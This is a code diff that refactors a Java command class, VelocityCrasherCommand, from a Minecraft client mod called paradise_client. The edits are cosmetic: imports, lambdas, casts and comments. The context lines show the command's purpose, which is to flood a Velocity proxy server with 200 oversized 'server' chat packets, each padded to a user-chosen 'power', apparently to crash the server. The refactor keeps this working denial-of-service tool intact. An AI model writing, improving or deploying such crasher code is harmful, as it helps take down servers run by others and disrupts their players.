@@ -1,14 +1,13 @@
 package net.paradise_client.command.impl;
 
-import com.mojang.brigadier.arguments.ArgumentType;
 import com.mojang.brigadier.arguments.IntegerArgumentType;
 import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import com.mojang.brigadier.builder.RequiredArgumentBuilder;
 import com.mojang.brigadier.context.CommandContext;
+import net.paradise_client.command.Command;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
-import net.paradise_client.command.Command;
 import net.minecraft.command.CommandSource;
 
 /**
@@ -31,23 +30,23 @@ public class VelocityCrasherCommand extends Command {
     }
 
     /**
-     * Registers this command with Brigadier.
+     * Registers this command's structure with Brigadier.
      */
     @Override
     public void register(LiteralArgumentBuilder<CommandSource> root) {
-        LiteralArgumentBuilder<CommandSource> literal = root.executes(this::executeDefault);
+        LiteralArgumentBuilder<CommandSource> literal = root.executes(ctx -> executeDefault(ctx));
 
         // "server" argument
         RequiredArgumentBuilder<CommandSource, String> serverArg =
-                RequiredArgumentBuilder.argument("server", (ArgumentType<String>) StringArgumentType.word())
-                        .executes(this::executeDefault);
+                RequiredArgumentBuilder.argument("server", StringArgumentType.word())
+                        .executes(ctx -> executeDefault(ctx));
 
         // "power" argument
         RequiredArgumentBuilder<CommandSource, Integer> powerArg =
-                RequiredArgumentBuilder.argument("power", (ArgumentType<Integer>) IntegerArgumentType.integer(200))
-                        .executes(this::executeAttack);
+                RequiredArgumentBuilder.argument("power", IntegerArgumentType.integer(200))
+                        .executes(ctx -> executeAttack(ctx));
 
-        // Chain: root -> server -> power
+        // Chain arguments together
         serverArg.then(powerArg);
         literal.then(serverArg);
     }
@@ -70,7 +69,7 @@ public class VelocityCrasherCommand extends Command {
             String msg = "server " + server + " " + filler.repeat(power);
 
             for (int i = 0; i < 200; i++) {
-                net.sendPacket((Packet<?>) new ChatMessageC2SPacket(msg));
+                net.sendPacket(new ChatMessageC2SPacket(msg));
             }
 
             try {
@@ -86,7 +85,6 @@ public class VelocityCrasherCommand extends Command {
 
     /**
      * Default executor when arguments are missing.
-     * Could print usage/help or simply succeed silently.
      */
     private int executeDefault(CommandContext<CommandSource> ctx) {
         return 1;
